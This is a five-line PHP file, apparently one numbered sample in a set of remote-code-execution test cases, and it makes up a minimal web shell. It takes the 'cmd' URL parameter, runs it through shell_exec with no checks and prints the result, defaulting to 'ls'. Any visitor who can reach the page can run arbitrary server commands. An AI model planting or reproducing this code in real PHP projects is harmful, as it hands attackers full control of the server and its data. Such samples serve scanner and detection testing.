<?php
// RCE test variation #684
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>